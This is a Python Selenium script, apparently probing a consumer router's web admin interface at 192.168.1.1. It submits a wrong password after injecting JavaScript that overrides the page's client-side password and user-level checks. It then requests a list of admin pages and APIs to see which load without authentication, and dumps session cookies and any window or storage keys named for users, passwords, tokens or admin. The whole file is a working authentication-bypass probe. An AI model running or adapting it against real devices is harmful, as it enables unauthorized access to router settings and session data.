#!/usr/bin/env python3
"""
Probe router endpoints via Selenium session after failed login.
Tests if any pages are accessible without valid credentials.
"""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time, json

def main():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break

    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(10)

    try:
        # Attempt login with wrong password
        driver.get("https://192.168.1.1/login.asp")
        time.sleep(3)

        driver.find_element(By.ID, "txt_Username").send_keys("admin")
        driver.find_element(By.ID, "txt_Password").send_keys("wrongpassword")

        driver.execute_script("""
            window.CheckPassword = function() { return 0; };
            window.setDisable = function() {};
            window.DisplayWifiPldt = function() {};
            window.Userlevel = 0;
        """)
        driver.execute_script("document.getElementById('button').style.display='';")
        driver.find_element(By.ID, "button").click()
        time.sleep(3)

        print(f"After login attempt URL: {driver.current_url}")

        # Probe endpoints in same browser session
        endpoints = [
            "/html/amp/wlanbasic/WlanBasic.asp",
            "/html/amp/advanced/Route.asp",
            "/html/amp/security/Firewall.asp",
            "/html/amp/system/DeviceInfo.asp",
            "/html/amp/system/Reboot.asp",
            "/html/amp/system/Password.asp",
            "/html/amp/system/Time.asp",
            "/html/amp/system/Diag.asp",
            "/html/amp/system/Log.asp",
            "/api/system/userinfo",
            "/api/system/version",
            "/api/system/deviceinfo",
            "/api/ntwk/gateway",
            "/tr064",
            "/HNAP1/",
        ]

        for ep in endpoints:
            try:
                driver.get(f"https://192.168.1.1{ep}")
                time.sleep(2)
                url = driver.current_url
                has_login = "txt_Username" in driver.page_source
                size = len(driver.page_source)
                status = "LOGIN REDIRECT" if has_login else f"ACCESSIBLE ({size} chars)"
                marker = " <<<" if not has_login else ""
                print(f"  {ep:50s} -> {url[-40:]:40s} [{status}]{marker}")
            except Exception as e:
                print(f"  {ep:50s} -> ERROR: {str(e)[:60]}")

        # Check cookies/session
        cookies = driver.get_cookies()
        print(f"\nCookies: {json.dumps(cookies, indent=2)}")

        # Check JS vars for auth/session info
        js_vars = driver.execute_script("""
            var r = {};
            try { r.window = Object.keys(window).filter(function(k) {
                return k.toLowerCase().indexOf('user') >= 0
                    || k.toLowerCase().indexOf('pass') >= 0
                    || k.toLowerCase().indexOf('auth') >= 0
                    || k.toLowerCase().indexOf('session') >= 0
                    || k.toLowerCase().indexOf('token') >= 0
                    || k.toLowerCase().indexOf('admin') >= 0
                    || k.toLowerCase().indexOf('hw_token') >= 0;
            }); } catch(e) { r.window_err = e.message; }
            try { r.localStorage = Object.keys(localStorage); } catch(e) {}
            try { r.sessionStorage = Object.keys(sessionStorage); } catch(e) {}
            return r;
        """)
        print(f"\nInteresting JS vars: {json.dumps(js_vars, indent=2)}")

    finally:
        driver.quit()

if __name__ == "__main__":
    main()
